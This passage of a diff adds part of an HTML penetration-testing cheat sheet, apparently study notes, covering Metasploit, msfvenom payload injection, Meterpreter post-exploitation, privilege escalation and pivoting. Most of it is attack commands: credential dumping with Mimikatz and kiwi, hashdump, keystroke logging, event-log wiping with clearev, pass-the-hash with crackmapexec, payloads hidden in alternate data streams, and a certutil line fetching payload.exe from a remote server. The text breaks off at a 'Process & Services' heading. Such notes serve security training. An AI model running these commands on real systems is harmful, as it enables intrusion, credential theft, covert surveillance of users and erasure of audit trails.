+</code></pre></div>
+<p>Perform an nmap scan from within MSF:</p>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> db_nmap &lt;nmap flags and options&gt;
+</code></pre></div>
+<h2 id="msf-wmap">MSF: WMAP</h2>
+<p>WMAP is available as an MSF plugin and can be loaded directly into MSF:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="nb">load</span><span class="w"> </span><span class="n">wmap</span>
+</code></pre></div>
+<p>Available commands:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">wmap_modules</span>
+<span class="o">-</span><span class="w"> </span><span class="n">wmap_nodes</span><span class="w"> </span>
+<span class="o">-</span><span class="w"> </span><span class="n">wmap_run</span><span class="w"> </span><span class="c1">// launch all modules, a subset matching a regex or based on the specified *profile*</span>
+<span class="o">-</span><span class="w"> </span><span class="n">wmap_sites</span><span class="w"> </span><span class="c1">// list, add and remove sites - see wmap_sites -h</span>
+<span class="o">-</span><span class="w"> </span><span class="n">wmap_targets</span><span class="w"> </span><span class="c1">// list, add and remove targets (sites added from previous command) </span>
+<span class="o">-</span><span class="w"> </span><span class="n">wmap_vulns</span>
+</code></pre></div>
+<h2 id="msfvenom">MSFVenom</h2>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">msfvenom</span><span class="w"> </span><span class="o">--</span><span class="n">list</span><span class="w">  </span><span class="n">payloads</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">available</span><span class="w"> </span><span class="n">payloads</span>
+<span class="o">-</span><span class="w"> </span><span class="n">msfvenom</span><span class="w"> </span><span class="o">--</span><span class="n">list</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">available</span><span class="w"> </span><span class="n">formats</span>
+<span class="o">-</span><span class="w"> </span><span class="n">msfvenom</span><span class="w"> </span><span class="o">--</span><span class="n">list</span><span class="w"> </span><span class="n">archs</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">available</span><span class="w"> </span><span class="n">architectures</span>
+<span class="o">-</span><span class="w"> </span><span class="n">msfvenom</span><span class="w"> </span><span class="o">--</span><span class="n">list</span><span class="w"> </span><span class="n">encoders</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="n">available</span><span class="w"> </span><span class="n">encoders</span>
+</code></pre></div>
+<p>It's possible to specify the architecture with this option:</p>
+<div class="highlight"><pre><span></span><code>- -a &lt;arch&gt;
+</code></pre></div>
+<p>To use a payload:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">--</span><span class="n">payload</span><span class="w"> </span><span class="o">&lt;</span><span class="n">payload</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">PAYLOAD</span><span class="w"> </span><span class="n">PARAMS</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="n">value</span><span class="o">&gt;</span>
+</code></pre></div>
+<p>To specify the format:</p>
+<div class="highlight"><pre><span></span><code>- -f | --format &lt;format&gt;
+</code></pre></div>
+<p>To specify an encoder:</p>
+<div class="highlight"><pre><span></span><code>- -e | --encoder &lt;encoder&gt;
+</code></pre></div>
+<p>To specify the number of iterations for the encoding:</p>
+<div class="highlight"><pre><span></span><code>- -i | --iterations &lt;iterations&gt;
+</code></pre></div>
+<p>Inject payloads into legitimate Windows Portable Executables</p>
+<div class="highlight"><pre><span></span><code>- -x | --template 
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>Preserve the binary behaviour of the specified template:
+- -k | --keep
+</code></pre></div>
+<h2 id="meterpreter">Meterpreter</h2>
+<p>Get OS info:</p>
+<div class="highlight"><pre><span></span><code>- sysinfo
+</code></pre></div>
+<p>Get current user id and privileges:</p>
+<div class="highlight"><pre><span></span><code>- getuid
+- getprivs
+</code></pre></div>
+<p>Get environment variable:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">getenv</span><span class="w"> </span><span class="o">&lt;</span><span class="n">variable</span><span class="o">&gt;</span>
+</code></pre></div>
+<p>Background current session:</p>
+<div class="highlight"><pre><span></span><code>- background | CTRL + z
+</code></pre></div>
+<p>Edit file:</p>
+<div class="highlight"><pre><span></span><code>- edit &lt;file path&gt;
+</code></pre></div>
+<p>Download file:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">download</span><span class="w"> </span><span class="o">&lt;</span><span class="n">file</span><span class="w"> </span><span class="n">path</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">local</span><span class="w"> </span><span class="n">destination</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">default</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">path</span><span class="o">&gt;</span>
+</code></pre></div>
+<p>Upload file:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="o">&lt;</span><span class="n">local</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">path</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="k">remote</span><span class="w"> </span><span class="n">destination</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">default</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">path</span><span class="o">&gt;</span>
+</code></pre></div>
+<p>Search for a file or directory:</p>
+<div class="highlight"><pre><span></span><code>- search -d &lt;starting path&gt; -f &lt;file name&gt;
+</code></pre></div>
+<p>Open a shell:</p>
+<div class="highlight"><pre><span></span><code>- shell
+</code></pre></div>
+<p>List processes:</p>
+<div class="highlight"><pre><span></span><code>- ps
+</code></pre></div>
+<p>Migrate to process:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="nv">pgrep</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">process</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="nv">obtain</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">process</span><span class="w"> </span><span class="nv">PID</span>,<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">example</span>:<span class="w"> </span><span class="nv">explorer</span><span class="w"> </span><span class="nv">or</span><span class="w"> </span><span class="nv">lsass</span>
+<span class="o">-</span><span class="w"> </span><span class="nv">migrate</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">PID</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="nv">migrate</span><span class="w"> </span><span class="nv">meterpreter</span><span class="w"> </span><span class="nv">session</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="nv">PID</span><span class="w"> </span><span class="ss">(</span><span class="nv">explorer</span><span class="w"> </span><span class="nv">will</span><span class="w"> </span><span class="nv">be</span><span class="w"> </span><span class="nv">x64</span><span class="ss">)</span>
+<span class="nv">OR</span>
+<span class="o">-</span><span class="w"> </span><span class="nv">migrate</span><span class="w"> </span><span class="o">-</span><span class="nv">N</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">process</span><span class="w"> </span><span class="nv">name</span><span class="o">&gt;</span>
+</code></pre></div>
+<p>Run command on the target system:</p>
+<div class="highlight"><pre><span></span><code>- execute &lt;command&gt;
+</code></pre></div>
+<p>Upgrade simple shell to meterpreter:</p>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> Background current session
+<span class="k">-</span> use post/multi/manage/shell_to_meterpreter
+
+OR
+
+<span class="k">-</span> sessions -u &lt;session id&gt;
+</code></pre></div>
+<p>Post exploitation useful commands:</p>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> getsystem - try elevate privileges
+<span class="k">-</span> hashdump - dump password hashes
+<span class="k">-</span> screenshot - take a screenshot of a desktop session
+<span class="k">-</span> keyscan_start | keyscan_stop | keyscan_dump - start recording, stop recording and dump keytrokes from an active user session
+<span class="k">-</span> screenshare - watch user's desktop in realtime
+<span class="k">-</span> clearev - remove event logs
+</code></pre></div>
+<h2 id="post-exploitation-modules">Post-Exploitation Modules</h2>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">migrate</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">migrate</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">process</span>
+<span class="o">-</span><span class="w"> </span><span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">archmigrate</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">change</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="n">architecture</span>
+<span class="o">-</span><span class="w"> </span><span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gathern</span><span class="o">/</span><span class="n">win_privs</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">Gather</span><span class="w"> </span><span class="n">Privileges</span><span class="w"> </span><span class="n">Enumeration</span>
+<span class="o">-</span><span class="w"> </span><span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_logged</span><span class="w"> </span><span class="n">on_users</span>
+<span class="o">-</span><span class="w"> </span><span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">checkvm</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">running</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">windows</span><span class="w"> </span><span class="n">VM</span>
+<span class="o">-</span><span class="w"> </span><span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_applications</span>
+<span class="o">-</span><span class="w"> </span><span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_av_excluded</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Enumerate</span><span class="w"> </span><span class="n">AV</span><span class="w"> </span><span class="n">exclusions</span>
+<span class="o">-</span><span class="w"> </span><span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_computers</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Enum</span><span class="w"> </span><span class="n">computers</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">part</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">domain</span>
+<span class="o">-</span><span class="w"> </span><span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_patches</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Enum</span><span class="w"> </span><span class="n">installed</span><span class="w"> </span><span class="n">hotfixes</span>
+<span class="o">-</span><span class="w"> </span><span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_shares</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Enum</span><span class="w"> </span><span class="n">SMB</span><span class="w"> </span><span class="n">shares</span>
+<span class="o">-</span><span class="w"> </span><span class="n">post</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">enable_rdp</span>
+</code></pre></div>
+<h2 id="msf-pivoting">MSF: Pivoting</h2>
+<p>Add route to another subnet:</p>
+<div class="highlight"><pre><span></span><code>- run autoroute -s &lt;subnet&gt;
+OR
+- use post/multi/manage/autoroute
+</code></pre></div>
+<p>List active routes:</p>
+<div class="highlight"><pre><span></span><code>- run autoroute -p
+</code></pre></div>
+<p>Port forwarding:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="nx">portfw</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="o">-</span><span class="nx">l</span><span class="w"> </span><span class="p">&lt;</span><span class="nx">local</span><span class="w"> </span><span class="nx">port</span><span class="p">&gt;</span><span class="w"> </span><span class="o">-</span><span class="nx">p</span><span class="w"> </span><span class="p">&lt;</span><span class="nx">remote</span><span class="w"> </span><span class="nx">port</span><span class="p">&gt;</span><span class="w"> </span><span class="o">-</span><span class="nx">r</span><span class="w"> </span><span class="p">&lt;</span><span class="nx">remote</span><span class="w"> </span><span class="nx">address</span><span class="p">&gt;</span>
+</code></pre></div>
+<h1 id="windows-privilege-escalation_1">Windows Privilege Escalation</h1>
+<p>https://github.com/itm4n/PrivescCheck</p>
+<h3 id="windows-kernel-exploitation">Windows Kernel Exploitation</h3>
+<ul>
+<li><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>:  This tool compares a targets patch levels against the
+Microsoft vulnerability database in order to detect potential missing patches on the
+target.</li>
+<li><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135">Windows-Kernel-Exploits</a> : Collection of Windows Kernel exploits sorted by CVE.</li>
+</ul>
+<h3 id="metasploit_13">Metasploit</h3>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> post/multi/recon/local_exploit_suggester
+</code></pre></div>
+<h2 id="bypassing-uac_1">Bypassing UAC</h2>
+<p><a href="https://github.com/hfiref0x/UACME">UACMe</a> is an open source, robust privilege escalation tool developed by @hfire0x. It can be used to bypass Windows UAC by leveraging various techniques</p>
+<ul>
+<li>It allows attackers to execute malicious payloads on a Windows target with
+administrative/elevated privileges by abusing the inbuilt Windows AutoElevate tool.</li>
+</ul>
+<h2 id="access-token-impersonation">Access Token Impersonation</h2>
+<h3 id="meterpreter_1">Meterpreter</h3>
+<p>Meterpreter has an "Incognito" module that allows you to impersonate user tokens after successful exploitation.</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="nb">load</span><span class="w"> </span><span class="n">incognito</span>
+</code></pre></div>
+<h2 id="windows-file-system-vulnerabilities_1">Windows File System Vulnerabilities</h2>
+<h3 id="alternate-data-streams">Alternate Data Streams</h3>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">notepad</span><span class="w"> </span><span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;.</span><span class="n">txt</span><span class="p">:</span><span class="o">&lt;</span><span class="n">meta</span><span class="o">&gt;.</span><span class="n">txt</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">empty</span><span class="w"> </span><span class="n">txt</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">whilst</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">editor</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">allow</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">insert</span><span class="w"> </span><span class="n">some</span><span class="w"> </span><span class="n">content</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">specified</span><span class="w"> </span><span class="n">meta</span><span class="w"> </span><span class="p">(</span><span class="n">into</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Resource</span><span class="w"> </span><span class="n">Stream</span><span class="p">)</span><span class="w"> </span><span class="n">instead</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Data</span><span class="w"> </span><span class="n">Stream</span>
+<span class="o">-</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="n">payload</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;.</span><span class="n">txt</span><span class="p">:</span><span class="o">&lt;</span><span class="n">meta</span><span class="o">&gt;.</span><span class="n">exe</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">same</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">before</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="n">setting</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">binary</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">meta</span><span class="w"> </span><span class="n">value</span>
+
+<span class="n">To</span><span class="w"> </span><span class="n">exploit</span><span class="w"> </span><span class="n">it</span><span class="p">:</span>
+<span class="o">-</span><span class="w"> </span><span class="n">start</span><span class="w"> </span><span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">meta</span><span class="o">&gt;.</span><span class="n">exe</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">useful</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">symlink</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">meta</span><span class="o">&gt;.</span><span class="n">exe</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">working</span>
+<span class="w">    </span><span class="o">-</span><span class="w">  </span><span class="n">mklink</span><span class="w"> </span><span class="o">&lt;</span><span class="n">link</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">start</span><span class="w"> </span><span class="o">&lt;</span><span class="n">link</span><span class="o">&gt;</span>
+</code></pre></div>
+<h1 id="windows-credential_2">Windows Credential</h1>
+<p>The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:</p>
+<ul>
+<li><code>C:\Windows\Panther\Unattend.xml</code></li>
+<li><code>C:\Windows\Panther\Autounattend.xml</code></li>
+</ul>
+<p>CMD Download files from remote server:</p>
+<div class="highlight"><pre><span></span><code><span class="n">certutil</span><span class="w"> </span><span class="o">-</span><span class="n">urlcache</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//&lt;</span><span class="k">remote</span><span class="w"> </span><span class="n">server</span>\<span class="o">&gt;/</span><span class="n">payload</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="n">payload</span><span class="o">.</span><span class="n">exe</span>
+</code></pre></div>
+<p>In a Meterpreter session, search for a file matching the specified name:</p>
+<div class="highlight"><pre><span></span><code><span class="n">- search -f &lt;name&gt; -&gt; ex: search -f Unattend.xml</span>
+</code></pre></div>
+<h2 id="exfiltrate-crack-passwords">Exfiltrate &amp; Crack Passwords</h2>
+<h3 id="mimikatz">Mimikatz</h3>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="nv">privileg</span>::<span class="nv">debug</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="nv">check</span><span class="w"> </span><span class="nv">available</span><span class="w"> </span><span class="nv">privileges</span>.<span class="w"> </span><span class="k">If</span><span class="w"> </span><span class="nv">Privilege</span><span class="w"> </span><span class="s1">'20'</span><span class="w"> </span><span class="nv">OK</span><span class="w"> </span>,<span class="w"> </span><span class="nv">it</span><span class="err">'s all good</span>
+<span class="err">- lsadump::sam // dump sam from lsass cache</span>
+<span class="err">- lsadump::secrets // dump secrets</span>
+<span class="err">- sekurels::logonpasswords // bad configuration allow storing cleartext password every time a user logs in</span>
+</code></pre></div>
+<p><strong>Mimikatz will require elevated privileges in order to run correctly since lsass is a ran by the administrator user.</strong></p>
+<h3 id="metasploit_14">Metasploit</h3>
+<p>To extract hashes from lsass process:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="nb">load</span><span class="w"> </span><span class="n">kiwi</span>
+<span class="w">    </span><span class="o">-</span><span class="w"> </span><span class="n">creds_all</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">retrieve</span><span class="w"> </span><span class="n">all</span><span class="w"> </span><span class="n">ceredentials</span><span class="w"> </span><span class="p">(</span><span class="n">kerberos</span><span class="p">,</span><span class="w"> </span><span class="n">livessp</span><span class="p">,</span><span class="w"> </span><span class="n">msv</span><span class="p">,</span><span class="w"> </span><span class="n">etc</span><span class="o">.</span><span class="p">)</span>
+<span class="w">    </span><span class="o">-</span><span class="w"> </span><span class="n">lsa_dump_sam</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">dump</span><span class="w"> </span><span class="n">hashes</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">LSA</span><span class="w"> </span><span class="n">SAM</span><span class="w">  </span>
+<span class="w">    </span><span class="o">-</span><span class="w"> </span><span class="n">lsa_dump_secrets</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">some</span><span class="w"> </span><span class="n">cases</span><span class="w"> </span><span class="n">could</span><span class="w"> </span><span class="n">provide</span><span class="w"> </span><span class="n">clear</span><span class="w"> </span><span class="n">text</span><span class="w"> </span><span class="n">passwords</span>
+</code></pre></div>
+<h3 id="cracking">Cracking</h3>
+<div class="highlight"><pre><span></span><code>- john --format=NT &lt;hashes file&gt; --wordlist=&lt;wordlist&gt;
+- hashcat -a3 -m 1000 &lt;hashes file&gt; &lt;wordlist&gt;
+</code></pre></div>
+<h2 id="pass-the-hash-attack_1">Pass-the-Hash Attack</h2>
+<h3 id="metasploit_15">Metasploit</h3>
+<p>In modules using authentication, it's possible to pass the LM:NTLM hash belonging to a user as his password.</p>
+<h3 id="crackmapexec_1">Crackmapexec</h3>
+<div class="highlight"><pre><span></span><code>- crackmapexec smb &lt;target&gt; -u &lt;User&gt; -p &lt;Password&gt; (or -H &lt;Hash&gt;) -x "&lt;command&gt;"
+- crackmapexec smb &lt;target&gt; -u &lt;User&gt; -p &lt;Password&gt; (or -H &lt;Hash&gt;) -x "&lt;command&gt;"
+</code></pre></div>
+<h1 id="linux-privilege-escalation_2">Linux Privilege Escalation</h1>
+<h2 id="bash-cve-2014-6271-vulnerability-shellshock">Bash CVE-2014-6271 Vulnerability (Shellshock)</h2>
+<h3 id="nmap_16">NMAP</h3>
+<div class="highlight"><pre><span></span><code>- nmap  -sV  --script=http-shellshock --script-args "http-shellshock.uri=/&lt;cgi script location&gt;" &lt;target&gt;
+</code></pre></div>
+<h3 id="metsploit">Metsploit</h3>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> auxiliary/scanner/http/apache_mod_cgi_bash_env
+<span class="k">-</span> exploit/multi/http/apache_mod_cgi_bash_env_exec
+</code></pre></div>
+<h2 id="linux-kernel-exploits_1">Linux Kernel Exploits</h2>
+<ul>
+<li><a href="https://github.com/mzet-/linux-exploit-suggester">Linux-Exploit-Suggester</a>:  assesses (using heuristics methods) the exposure of the given kernel on every publicly known Linux kernel exploit.</li>
+</ul>
+<h2 id="linux-credential-cracking">Linux Credential Cracking</h2>
+<h3 id="metasploit_16">Metasploit</h3>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> auxiliary/analyze/crack_linux
+</code></pre></div>
+<h3 id="johntheripper">JohnTheRipper</h3>
+<div class="highlight"><pre><span></span><code>- unshadow passwd.txt shadow.txt &gt; unshadowed.txt
+- john --wordlist=&lt;wordlist&gt; unshadowed.txt
+</code></pre></div>
+<h3 id="hashcat">Hashcat</h3>
+<div class="highlight"><pre><span></span><code>hashcat -m 1800 -a 0 &lt;hashes fil&gt; &lt;wordlist&gt;
+</code></pre></div>
+<h1 id="windows-post-exploitation_2">Windows Post-Exploitation</h1>
+<h2 id="enumeration_2">Enumeration</h2>
+<p>System Information:</p>
+<div class="highlight"><pre><span></span><code><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">sysinfo</span><span class="w"> </span><span class="p">(</span><span class="nx">from</span><span class="w"> </span><span class="nx">Meterpreter</span><span class="p">)</span>
+<span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">hostname</span>
+<span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">systeminfo</span>
+<span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">wmic</span><span class="w"> </span><span class="nx">qfe</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="p">&lt;</span><span class="nx">Optionally</span><span class="p">:</span><span class="w"> </span><span class="nx">Comma</span><span class="o">-</span><span class="nx">separated</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">fields</span><span class="p">&gt;</span>
+<span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">ex</span><span class="p">:</span><span class="w"> </span><span class="nx">Caption</span><span class="p">,</span><span class="nx">Description</span><span class="p">,</span><span class="nx">HotFixID</span><span class="p">,</span><span class="nx">InstalledOn</span>
+<span class="o">-</span><span class="w"> </span><span class="k">type</span><span class="w"> </span><span class="nx">C</span><span class="p">:</span><span class="err">\\</span><span class="nx">Windows</span><span class="err">\</span><span class="nx">System32</span><span class="err">\</span><span class="nx">eula</span><span class="p">.</span><span class="nx">txt</span>
+</code></pre></div>
+<p>Users &amp; Groups:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">getuid</span><span class="w"> </span><span class="p">(</span><span class="n">from</span><span class="w"> </span><span class="n">Meterpreter</span><span class="p">)</span>
+<span class="o">-</span><span class="w"> </span><span class="n">getprivs</span><span class="w"> </span><span class="p">(</span><span class="n">from</span><span class="w"> </span><span class="n">Meterpreter</span><span class="p">)</span>
+<span class="o">-</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_logged_on_users</span><span class="w"> </span><span class="p">(</span><span class="n">msf</span><span class="w"> </span><span class="n">module</span><span class="p">)</span>
+<span class="o">-</span><span class="w"> </span><span class="n">whoami</span>
+<span class="o">-</span><span class="w"> </span><span class="n">whoami</span><span class="w"> </span><span class="o">/</span><span class="n">priv</span>
+<span class="o">-</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="p">(</span><span class="n">currently</span><span class="w"> </span><span class="n">logged</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">users</span><span class="p">)</span>
+<span class="o">-</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="n">users</span>
+<span class="o">-</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="o">&lt;</span><span class="n">username</span><span class="o">&gt;</span>
+<span class="o">-</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="n">localgroup</span>
+<span class="o">-</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="n">localgroup</span><span class="w"> </span><span class="o">&lt;</span><span class="n">group</span><span class="o">&gt;</span>
+</code></pre></div>
+<p>Network Informations:</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="nv">ipconfig</span><span class="w"> </span><span class="o">/</span><span class="nv">all</span>
+<span class="o">-</span><span class="w"> </span><span class="nv">route</span><span class="w"> </span><span class="nv">print</span>
+<span class="o">-</span><span class="w"> </span><span class="nv">arp</span><span class="w"> </span><span class="o">-</span><span class="nv">a</span>
+<span class="o">-</span><span class="w"> </span><span class="nv">netstat</span><span class="w"> </span><span class="o">-</span><span class="nv">ano</span>
+<span class="o">-</span><span class="w"> </span><span class="nv">netsh</span><span class="w"> </span><span class="nv">firewall</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="nv">state</span><span class="w"> </span><span class="ss">(</span><span class="nv">Windows</span><span class="w"> </span><span class="nv">Firewall</span><span class="w"> </span><span class="nv">state</span><span class="ss">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">DEPRECATED</span>
+<span class="o">-</span><span class="w"> </span><span class="nv">netsh</span><span class="w"> </span><span class="nv">advfirewall</span><span class="w"> </span><span class="k">show</span><span class="w"> </span><span class="nv">allprofiles</span><span class="w"> </span><span class="ss">(</span><span class="nv">Windows</span><span class="w"> </span><span class="nv">Firewall</span><span class="w"> </span><span class="nv">state</span><span class="ss">)</span>
+<span class="o">-</span><span class="w"> </span><span class="nv">netsh</span><span class="w"> </span><span class="nv">advfirewall</span><span class="w"> </span><span class="nv">firewall</span><span class="w"> </span><span class="nv">dump</span><span class="w"> </span><span class="ss">(</span><span class="nv">Dump</span><span class="w"> </span><span class="nv">Windows</span><span class="w"> </span><span class="nv">Firewall</span><span class="w"> </span><span class="nv">configuration</span><span class="ss">)</span>&ugrave;
+</code></pre></div>
+<p>Process &amp; Services:</p>
